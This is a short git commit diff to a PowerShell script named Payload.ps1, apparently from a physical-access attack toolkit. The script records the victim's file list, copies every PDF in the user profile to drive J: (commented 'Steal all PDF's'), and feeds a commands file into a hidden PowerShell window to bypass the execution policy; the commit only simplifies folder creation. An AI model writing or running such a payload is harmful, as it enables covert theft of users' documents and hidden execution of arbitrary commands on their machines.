f4af03ed8977aedeb4370f0ca009de82eacec91c
Craig Dods <craig.dods@gmail.com>
2017-03-02 15:05:14 -0500

    Update Payload.ps1

--- Payload.ps1
+++ Payload.ps1
@@ -2,18 +2,11 @@ $User=$env:UserName
 $Domain=$env:UserDomain
 $Storage="J:\$Domain\$User"
 cd J:
-mkdir $Domain
-cd $Domain
-mkdir $User
-
-
-
+mkdir $Storage
 #List and record all files
 Get-ChildItem -Recurse C:\Users\$User > $Storage\Current_File_List.txt
-
 # Steal all PDF's
 Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage}
-
 #Bypass Restricted Execution Policy and launch Today's commands
 cat J:\todays-commands.txt | powershell.exe -windowstyle hidden
 
